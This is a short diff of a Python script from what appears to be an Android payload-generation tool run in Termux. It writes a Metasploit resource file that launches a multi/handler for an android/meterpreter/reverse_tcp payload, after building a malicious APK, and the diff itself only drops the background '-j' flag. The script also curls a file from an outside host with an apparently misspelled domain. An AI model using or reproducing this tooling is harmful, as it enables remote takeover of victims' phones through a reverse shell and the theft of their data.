@@ -143,7 +143,7 @@ def proceso_termux():
 	print ("")
 	print (vr + "El Payload " + nom + ".apk se ha generado con éxito y se ha guardado en /storage/emulated/0/Androsploit_Payloads" + r)
 	auto = open('autos.rc', 'w')
-	auto.write('use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nexploit -j'.format(host, port))
+	auto.write('use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nexploit'.format(host, port))
 	auto.close()
 	os.system("curl -LO https://Auxilus.girhub.io/database.yml")
 	os.system("mkdir -p $PREFIX/var/lib/postgresql")
